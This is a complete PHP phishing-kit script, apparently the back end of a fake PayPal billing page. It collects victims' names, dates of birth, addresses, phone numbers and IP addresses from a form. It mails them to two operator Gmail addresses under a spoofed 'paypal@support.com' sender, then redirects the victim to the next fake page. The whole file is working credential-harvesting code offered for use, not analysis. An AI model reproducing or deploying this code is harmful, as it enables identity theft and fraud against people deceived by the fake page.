<?php

/*
╔═════════════════════════════╗
╠═══ Fahmi trabelsi ═══╣
╠═══════              ════════╣
╠═════════           ═════════╣
╠═                          ══╣
╚═════════════════════════════╝
*/

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$Country = $_POST['_countr'];

$message .= "=========[BILLING INFOS]=========\n";
$message .= "Name  : ".$_POST['gg1']." ".$_POST['_ln']."\n";
$message .= "Prenom: ".$_POST['gg2']." ".$_POST['_ln']."\n";
$message .= "Date of birth  : ".$_POST['_birthd']."-".$_POST['_birthm']."-".$_POST['_birthy']."\n";
$message .= "Address 1  : ".$_POST['gg4']."\n";
$message .= "address 2  : ".$_POST['gg5']."\n";
$message .= "Country  : ".$_POST['gg7']."\n";
$message .= "City  : ".$_POST['gg6']."\n";
$message .= "State  : ".$_POST['_st']."\n";
$message .= "ZIP  : ".$_POST['gg8']."\n";
$message .= "Phone Type  : ".$_POST['gg9']."\n";
$message .= "Phone  : ".$_POST['gg10']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[BY TraBelsi Fahmi]=========";

$to = "trabelsiifahmi@gmail.com,safou22wow@gmail.com";
$subject = "BILLING (50%) $Country [$ip]";
$headers = "From: Fahmi/Safwen (50%)<paypal@support.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);
header("Location:next.php");


?>